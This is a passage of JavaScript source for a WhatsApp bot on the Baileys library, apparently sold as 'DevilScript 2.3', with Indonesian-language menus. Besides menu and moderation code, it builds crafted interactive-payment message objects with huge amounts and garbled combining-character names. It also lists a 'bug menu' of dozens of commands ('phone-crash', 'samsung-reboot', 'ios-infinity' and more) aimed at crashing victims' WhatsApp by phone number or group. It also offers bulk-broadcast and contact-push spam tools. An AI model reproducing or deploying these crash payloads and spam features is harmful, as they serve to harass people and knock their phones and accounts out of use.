    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const sendReaction = async reactionContent => {
  anggazyy.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6281389850142:+62 813-8985-0142\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363301756685796@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner2}`,
inviteExpiration: Date.now() + 1814400000
}
}}

async function reply(teks) {
            const po = {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `DevilScript - 2.3 Powered By Anggazyy`,
                            body: '',
                            thumbnailUrl: "https://telegra.ph/file/f03ffe6089e8566317739.jpg",
                            sourceUrl: '',
                            mediaType: 1,
                            renderLargerThumbnail: false
                    }
                },
                text: teks
            };
            return anggazyy.sendMessage(m.chat, po, { quoted: qkontak }
            );
        };

//========== FUNCTION ===========//
let ppuser
try {
ppuser = await anggazyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function SendSlide(jid, img, txt = []) {
let anu = new Array()
let imgsc = await prepareWAMessageMedia({ image: img}, { upload: anggazyy.waUploadToServer })
for (let ii of txt) {
await anu.push({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `${ii}`
}),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Anggazyy Dev* Menyediakan Produk & Jasa Dibawah Ini 📦"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: anu
})
})}
}}, {userJid: m.sender, quoted: qtoko})
return anggazyy.relayMessage(jid, msgii.message, {
messageId: msgii.key.id
})}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


//========= SETTING EVENT ========//
if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
return anggazyy.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

/*if (global.antibug) {
if (!isGroup && m.isBaileys && !m.fromMe) {
await anggazyy.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await anggazyy.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
*Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
}}*/

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await anggazyy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await anggazyy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await anggazyy.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await anggazyy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await anggazyy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

switch (command) {
case "menu": case "p": case "pp": case "bokep": {
let teksnya = `*Haii* @${m.sender.split("@")[0]}!

Perkenalkan Saya Adalah *Bot WhatsApp Assistant* By @${owner} Yang Siap Membantu Anda

*乂 I N F O R M A T I O N*
◍ Botname : *${namabot2}*
◍ Mode : *${anggazyy.public ? "Public Mode" : "Self Mode"}*
◍ Uptime : *${runtime(process.uptime())}*
◍ Library : *Baileys V6.6.0*
◍ Version : *${global.version}*
◍ Total Premium User : *${premium.length < 1 ? "Tidak Ada" : premium.length + " User"}*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/png",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"jpegThumbnail": await resize(fs.readFileSync("./media/menu.jpg"), 400, 400),
"fileLength": 120000,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `© Devil Bot 2.3 - Powered By Anggazyy`,
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# Pilih List Menu Di Bawah Ini", "rows": [{ "header": "All Command", "title": "List All Command Bot", "description": "© ${namabot2}", "id": ".allmenu" }, 
{ "header": "Main Menu", "title": "List Main Menu Command", "description": "© ${namabot2}", "id": ".mainmenu" }, 
{ "header": "Downloader", "title": "List Downloader Command", "description": "© ${namabot2}", "id": ".downloadmenu" }, 
{ "header": "Bug Menu", "title": "List Bug Menu Command", "description": "© ${namabot2}", "id": ".bugmenu" }, 
{ "header": "Converter", "title": "List Converter Command", "description": "© ${namabot2}", "id": ".convertmenu" }, 
{ "header": "Pterodactyl Panel", "title": "List Pterodactyl Panel Command", "description": "© ${namabot2}", "id": ".panelmenu" }, 
{ "header": "Domain Menu", "title": "List Domain Menu Command", "description": "© ${namabot2}", "id": ".domainmenu" }, 
{ "header": "Store Menu", "title": "List Store Menu Command", "description": "© ${namabot2}", "id": ".storemenu" }, 
{ "header": "Group Menu", "title": "List Group Menu Command", "description": "© ${namabot2}", "id": ".grupmenu" }, 
{ "header": "Owner Menu", "title": "List Ownerbot Menu Command", "description": "© ${namabot2}", "id": ".ownermenu" }]}, { "title": "# Produk Owner Bot", "rows": [{ "header": "Panel Pterodactyl", "title": "List Harga Pterodactyl Panel", "description": "© ${namabot2}", "id": ".list_panel" }, 
{  "header": "Nokos WhatsApp", "title": "List Harga Nokos Whatsapp", "description": "© ${namabot2}", "id": ".list_nokos" }, 
{ "header": "VPS (Virtual Private Server)", "title": "List Harga VPS", "description": "© ${namabot2}", "id": ".list_vps" }, 
{ "header": "Domain Server", "title": "List Harga Domain", "description": "© ${namabot2}", "id": ".list_domain" }, 
{  "header": "Script Devil 2.3", "title": "List Harga Script Devil 2.3", "description": "© ${namabot2}", "id": ".list_scbot" }]}, { "title": "# Tools Owner Bot", "rows": [{ "header": "Auto Read", "title": "Pilih Opsi ON/OFF", "description": "© ${namabot2}", "id": ".autoread" }, 
{ "header": "Auto Read Story", "title": "Pilih Opsi ON/OFF", "description": "© ${namabot2}", "id": ".autoreadsw" }, 
{ "header": "Anti Call", "title": "Pilih Opsi ON/OFF", "description": "© ${namabot2}", "id": ".anticall" }]}]}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Script Bot\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender, owner+"@s.whatsapp.net"], 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}, externalAdReply: {
title: `Status : ${isOwner ? "Creator scriptt" : isPremium ? "Premium" : "Free"}`,
thumbnailUrl: ppuser,
body: `${ucapan()} ${m.pushName}`, 
sourceUrl: linkyt,
previewType: "PHOTO"
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "allmenu": {
let teksmenu = ` *Haii* @${m.sender.split("@")[0]}!
 *Selamat ${ucapan()}*
 
*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* listpremium
* pinterest
* qc
  
*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire
  
*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
  
*乂 P A N E L M E N U*
* addadmin
* addadmin2
* cpanel
* cpanel2
* cpanel3
* listpanel
* listadmin
* deladmin
* delpanel
  
*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
  
*乂 S T O R E M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmhidetag
* jpmhidetag2
* startjpm
* startjpmslide
* setteksjpm
* teksjpm

*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
  
*乂 O W N E R M E N U*
* addowner
* addpremium
* delpremium
* delowner
* listowner
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* autoreadsw
* welcome
* getcase
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot
* jadibot
* listjadibot
* stopjadibot`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "mainmenu": {
let teksmenu = `*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* listpremium
* sticker
* pinterest
* qc`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "downloadmenu": {
let teksmenu = `*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "produkmenu": case "prd": {
let teksmenu = `*Haii Kak* @${m.sender.split("@")[0]}!

Silahkan Pilih Salah Satu List Produk Di Bawah Ini Dengan Cara Klik Tombol *Pilih Produk*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Produk", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Panel Run Bot", "title": "List Harga Panel", "id": ".list_panel" }, 
{ "header": "VPS", "title": "List Harga Vps", "id": ".list_vps" }, 
{ "header": "Domain", "title": "List Harga Domain", "id": ".list_domain" }, 
{ "header": "Script Bot", "title": "List Harga Script Bot", "id": ".list_scbot" }]}]}`
},
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "storemenu": {
let teksmenu = `*乂 S T O R E M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmhidetag
* jpmhidetag2
* startjpm
* startjpmslide
* setteksjpm
* teksjpm`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Jpm All Grup\",\"title\":\"Start Jpm\",\"id\":\".startjpm\"}" 
},
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Jpm Slide All Grup\",\"title\":\"Start Jpm Slide\",\"id\":\".startjpmslide\"}" 
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "convertmenu": {
let teksmenu = `*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "bugmenu": {
let teksmenu = `*乂 B U G M E N U*
╭─❑ 「 *BUG EXTERNAL* 」 ❑──
│◦   ${prefix}onekil 62xxx
│◦   ${prefix}systemuicrash 62xxx, jumlah
│◦   ${prefix}doublekil 62xxx
│◦   ${prefix}triplekill 62xxxx
│◦   ${prefix}devil-list 62xxx|jumlah
│◦   ${prefix}notif-ui 62xxx
│◦   ${prefix}notif-crash 62xxx
│◦   ${prefix}crash-total 62xxx
│◦   ${prefix}devilbug 62xxx
│◦   ${prefix}unlimited-bug 62xxx
│◦   ${prefix}chace-bug 62xxx
│◦   ${prefix}phone-crash 62xxx
│◦   ${prefix}devilreact *<reply message>*
╰❑

╭─❑ 「 *BUG INTERNAL* 」 ❑──
│◦   ${prefix}internal-crash 62xxx, jumlah
│◦   ${prefix}internal-ui 62xxx, jumlah
│◦   ${prefix}crash-myinter 62xxx, jumlah
│◦   ${prefix}devil-internal 62xxx, jumlah
│◦   ${prefix}devil-external 62xxx, jumlah
│◦   ${prefix}engine-crash 62xxx, jumlah
│◦   ${prefix}engine-internal 62xxx, jumlah
│◦   ${prefix}engine-external 62xxx, jumlah
│◦   ${prefix}engine-ui 62xxx, jumlah
│◦   ${prefix}bug-engine 62xxx, jumlah
│◦   ${prefix}bug-quoted 62xxx
│◦   ${prefix}internal-quoted 62xxx
│◦   ${prefix}external-quoted 62xxx
╰❑

╭─❑ 「 *INTERNAL GROUP BUG* 」 ❑──
│◦   ${prefix}bug-button link group
│◦   ${prefix}bug-sitexyz link group
│◦   ${prefix}button-internal link group
│◦   ${prefix}button-external link group
│◦   ${prefix}ui-grup link group
│◦   ${prefix}bug-hole 120###@g.us
│◦   ${prefix}enemygroup 120###@g.us
│◦   ${prefix}internal-group 120###@g.us
│◦   ${prefix}external-group 120###@g.us
╰❑

╭─❑ 「 *Emoji Bug* 」 ❑──
│◦   ${prefix}🔥 62xxx
│◦   ${prefix}🌷 62xxx
│◦   ${prefix}💥 62xxx
│◦   ${prefix}🌹 62xxx
│◦   ${prefix}⭐ 62xxx
│◦   ${prefix}⚡ 62xxx
│◦   ${prefix}😈 62xxx
│◦   ${prefix}💀 62xxx
╰❑

╭─❑ 「 *Bug Jids* 」 ❑──
│◦   ${prefix}jids-toui 62xxx, jumlah
│◦   ${prefix}jids-engine 62xxx, jumlah
│◦   ${prefix}jids-internal 62xxx, jumlah
│◦   ${prefix}jids-external 62xxx, jumlah
│◦   ${prefix}jids-system 62xxx, jumlah
│◦   ${prefix}jids-lol 62xxx, jumlah
│◦   ${prefix}jids-unexpected 62xxx, jumlah
╰❑

╭─❑ 「 *Bug Cringe* 」 ❑──
│◦   ${prefix}cringe 62xxx
│◦   ${prefix}kekuatanhitam 62xxx
│◦   ${prefix}jomok 62xxx
│◦   ${prefix}goyang 62xxx
│◦   ${prefix}jomokblank 62xxx
│◦   ${prefix}mampuslu 62xxx
╰❑

╭─❑ 「 *Bug Blank* 」 ❑──
│◦   ${prefix}blank 62xxx, jumlah
│◦   ${prefix}blank-ui 62xxx, jumlah
│◦   ${prefix}blank-dark, jumlah
│◦   ${prefix}eror-bug, jumlah
│◦   ${prefix}spesial-bug 62xxx, jumlah
│◦   ${prefix}anything-crash 62xxx, jumlah
╰❑

╭─❑ 「 *Bug Samsung* 」 ❑──
│◦   ${prefix}samsung-bug 62xxx
│◦   ${prefix}samsung-ui 62xxx
│◦   ${prefix}samsung-internal 62xxx
│◦   ${prefix}samsung-external 62xxx
│◦   ${prefix}samsung-reboot 62xxx
│◦   ${prefix}samsung-crash 62xxx
╰❑

╭─❑ 「 *Bug List V1.1* 」 ❑──
│◦   ${prefix}bug-list 62xxx, jumlah
│◦   ${prefix}buglist-ui 62xxx, jumlah
│◦   ${prefix}buglist-crash 62xxx, jumlah
│◦   ${prefix}buglist-external 62xxx, jumlah
│◦   ${prefix}buglist-internal 62xxx, jumlah
│◦   ${prefix}buglist-engine 62xxx, jumlah
╰❑

╭─❑ 「 *Bug SUPER VIP* 」 ❑──
│◦   ${prefix}bug-vip 62xxx <bug super vip>
╰❑


╭─❑ 「 *Iphone Bug* 」 ❑──
│◦   ${prefix}ios-ui 62xxx
│◦   ${prefix}ios-unlimitedj 62xxx
│◦   ${prefix}ios-infinity 62xxx|timer
│◦   ${prefix}ios-uicrash 62xxx|timer
╰❑

╭─❑ 「 *Bug Saluran [BETA]* 」 ❑──
│◦   ${prefix}bug-saluran <link saluran>
╰❑

╭─❑ 「 *Bug strong* 」 ❑──
│◦   ${prefix}devil-strong 62xx
│◦   ${prefix}devil-unexpected 62xx
│◦   ${prefix}anggazyygo 62xx
│◦   ${prefix}pokemon 62xxx
│◦   ${prefix}elania-strong 62xx
│◦   ${prefix}devil-xcrash 62xxx
╰❑

╭─❑ 「 *Pemusnah enemy bug* 」 ❑──
│◦   ${prefix}bantai-dia 62xxx, jumlah
│◦   ${prefix}kalahkan 62xxx, jumlah
│◦   ${prefix}kontol 62xxx, jumlah
│◦   ${prefix}caper 62xxx, jumlah
│◦   ${prefix}anggazyy-external 62xxx, jumlah
│◦   ${prefix}anggazyy-internal 62xxx, jumlah
